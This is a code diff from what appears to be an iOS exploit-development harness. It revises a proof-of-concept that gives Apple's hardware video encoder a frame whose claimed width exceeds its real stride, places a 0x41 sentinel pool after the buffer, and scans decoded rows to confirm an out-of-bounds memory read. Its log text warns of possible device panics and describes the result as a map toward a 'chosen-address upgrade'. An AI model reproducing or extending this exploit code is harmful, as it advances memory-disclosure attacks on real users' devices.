@@ -1247,19 +1247,17 @@ static void t3_capcb(void *refCon, void *srcRefCon, OSStatus s,
     int fd = open([[docs stringByAppendingPathComponent:@"p001_t3_sentinel_log.txt"]
                    UTF8String], O_CREAT | O_WRONLY | O_TRUNC, 0644);
     vt647Log(fd, out, @"");
-    vt647Log(fd, out, @"=== P001 T3 SENTINEL v2 — BGRA recipe + sentinel pool ===");
-    vt647Log(fd, out, @"The T3 v1 run (-12912 both devices) diffed against the T2");
-    vt647Log(fd, out, @"acceptance and found the recipe: BGRA claim + 32BGRA");
-    vt647Log(fd, out, @"source attrs at session create. v2 = that recipe, one");
-    vt647Log(fd, out, @"encode + one decode. The encoder honors bpr math (4096");
-    vt647Log(fd, out, @"rows of 64 px from 1MB). Sentinels (0x00 / 0xFF flats");
-    vt647Log(fd, out, @"alternating per page) sit AFTER the 1MB: they are only");
-    vt647Log(fd, out, @"read if AVE trusts the claimed 4096-wide metadata over");
-    vt647Log(fd, out, @"the stride. Hits decode to Y=0x10 (black) / Y=0xEB");
-    vt647Log(fd, out, @"(white) clusters; baselines ~4096 px each (gradient");
-    vt647Log(fd, out, @"rows 0 and 255) -- report only >8192 per class.");
+    vt647Log(fd, out, @"=== P001 T3 SENTINEL v4 — provenance run ===");
+    vt647Log(fd, out, @"v3 on-device FIRED: over-baseline 0x10/0xEB classes reached");
+    vt647Log(fd, out, @"the decoded sample. v4 pins PROVENANCE: the pool = one");
+    vt647Log(fd, out, @"flat 0x41 (no gradient row shares a value with another");
+    vt647Log(fd, out, @"row, so pool content decoded from 0x41 shows the SAME");
+    vt647Log(fd, out, @"flat Y across MANY rows; gradient rows are flat at one");
+    vt647Log(fd, out, @"row each). Modal flat-value row-count >> 1 = pool");
+    vt647Log(fd, out, @"provenance CONFIRMED + the claim-wide walk shape");
+    vt647Log(fd, out, @"(row span = which source rows the pool landed in).");
     vt647Log(fd, out, @"PANIC-POSSIBLE. One tap per force-quit. Not KRW.");
-    vt647Log(fd, out, @"START T3v3");
+    vt647Log(fd, out, @"START T3v4");
 
     size_t after = (size_t)T3_PAGES_AFTER * 4096;
     uint8_t *map = mmap(NULL, T3_BACKING + after, PROT_READ | PROT_WRITE,
@@ -1274,7 +1272,7 @@ static void t3_capcb(void *refCon, void *srcRefCon, OSStatus s,
         for (int c = 0; c < 256; c++) row[c] = (uint8_t)(r & 0xff);
     }
     for (int i = 0; i < T3_PAGES_AFTER; i++) {
-        memset(map + T3_BACKING + (size_t)i * 4096, (i % 2) ? 0xff : 0x00, 4096);
+        memset(map + T3_BACKING + (size_t)i * 4096, 0x41, 4096);
     }
     vt647Log(fd, out, @"  mmap OK (pool=%zu pages after the 1MB)",
              (size_t)T3_PAGES_AFTER);
@@ -1366,30 +1364,53 @@ static void t3_capcb(void *refCon, void *srcRefCon, OSStatus s,
             size_t ystride = CVPixelBufferGetBytesPerRowOfPlane(img, 0);
             size_t yh = CVPixelBufferGetHeightOfPlane(img, 0);
             size_t yw = CVPixelBufferGetWidthOfPlane(img, 0);
-            unsigned long black = 0, white = 0;          /* exact Y hits */
-            long firstBlackRow = -1, firstWhiteRow = -1;
+            /* per-row flat-value census: sample every 64th px; a row is
+               "flat at v" when all samples equal v. Gradient rows = flat
+               at ONE unique value each; pool rows (0x41 source) = MANY
+               rows sharing the SAME v. */
+            short rowVal[4096];              /* 0x100 = not flat */
+            for (size_t yy = 0; yy < yh; yy++) rowVal[yy] = 0x100;
             for (size_t yy = 0; yy < yh; yy++) {
                 uint8_t *row = ybase + yy * ystride;
-                for (size_t xx = 0; xx < yw; xx++) {
-                    if (row[xx] == 0x10) { black++;
-                        if (firstBlackRow < 0) firstBlackRow = (long)yy; }
-                    else if (row[xx] == 0xEB) { white++;
-                        if (firstWhiteRow < 0) firstWhiteRow = (long)yy; }
+                uint8_t v0 = row[0]; int flat = 1;
+                for (size_t xx = 64; xx < yw; xx += 64) {
+                    if (row[xx] != v0) { flat = 0; break; }
+                }
+                if (flat) rowVal[yy] = (short)v0;
+            }
+            int rowsPerVal[256]; long firstRowOfVal[256], lastRowOfVal[256];
+            memset(rowsPerVal, 0, sizeof rowsPerVal);
+            for (int i = 0; i < 256; i++) { firstRowOfVal[i] = -1; lastRowOfVal[i] = -1; }
+            for (size_t yy = 0; yy < yh; yy++) {
+                if (rowVal[yy] != 0x100) {
+                    int v = rowVal[yy];
+                    rowsPerVal[v]++;
+                    if (firstRowOfVal[v] < 0) firstRowOfVal[v] = (long)yy;
+                    lastRowOfVal[v] = (long)yy;
                 }
             }
+            int modal = 0;
+            for (int v = 1; v < 256; v++) if (rowsPerVal[v] > rowsPerVal[modal]) modal = v;
             vt647Log(fd, out, @"  decoded Y %zux%zu stride=%zu", yw, yh, ystride);
-            vt647Log(fd, out, @"  Y=0x10 black px=%lu firstRow=%ld (baseline ~4096)",
-                     black, firstBlackRow);
-            vt647Log(fd, out, @"  Y=0xEB white px=%lu firstRow=%ld (baseline ~4096)",
-                     white, firstWhiteRow);
-            if (black > 8192 || white > 8192) {
-                vt647Log(fd, out, @"  SENTINEL CLASSES OVER BASELINE = OOB READ DISCLOSURE");
-                vt647Log(fd, out, @"  (AVE trusted the claimed 4096-wide metadata over the");
-                vt647Log(fd, out, @"   stride: pool pages after 1MB reached the sample).");
-                vt647Log(fd, out, @"  firstRow indices + page parity = the walk-shape map.");
+            vt647Log(fd, out, @"  flat-run census: modal value=0x%02x rows=%d span=[%ld..%ld]",
+                     modal, rowsPerVal[modal], firstRowOfVal[modal], lastRowOfVal[modal]);
+            for (int v = 0; v < 256; v++) {
+                if (rowsPerVal[v] >= 4 && v != modal) {
+                    vt647Log(fd, out, @"    multi-row flat: v=0x%02x rows=%d span=[%ld..%ld]",
+                             v, rowsPerVal[v], firstRowOfVal[v], lastRowOfVal[v]);
+                }
+            }
+            if (rowsPerVal[modal] >= 20) {
+                vt647Log(fd, out, @"  POOL PROVENANCE CONFIRMED: many decoded rows flat at");
+                vt647Log(fd, out, @"  ONE value (gradient rows are single-row). The claim-");
+                vt647Log(fd, out, @"  wide walk is REAL: pool content reached the sample.");
+                vt647Log(fd, out, @"  Source value 0x41 expected luma ~= 0x48 (video-range).");
+                vt647Log(fd, out, @"  row span = the mapping from decoded rows to pool");
+                vt647Log(fd, out, @"  bytes = the shape map for the chosen-address upgrade.");
             } else {
-                vt647Log(fd, out, @"  VERDICT: sentinel reads = CLAMPED (bpr math honored,");
-                vt647Log(fd, out, @"  no claim-vs-stride overread from this recipe). Law data.");
+                vt647Log(fd, out, @"  VERDICT: single-row flats only (gradient shape) — the");
+                vt647Log(fd, out, @"  v3 classes were NOT pool-origin (heap/other VM origin");
+                vt647Log(fd, out, @"  still an OOB read, but provenance differs). Honest.");
             }
             CVPixelBufferUnlockBaseAddress(img, kCVPixelBufferLock_ReadOnly);
             CFRelease(img);
@@ -1401,7 +1422,7 @@ static void t3_capcb(void *refCon, void *srcRefCon, OSStatus s,
     /* NOTE: pb release already fired t3_release = the munmap (settle first) */
     VTCompressionSessionInvalidate(enc); CFRelease(enc);
     CFRelease(capSample);
-    vt647Log(fd, out, @"DONE T3v2 — paste back.");
+    vt647Log(fd, out, @"DONE T3v4 — paste back.");
     if (fd >= 0) close(fd);
     return out;
 }
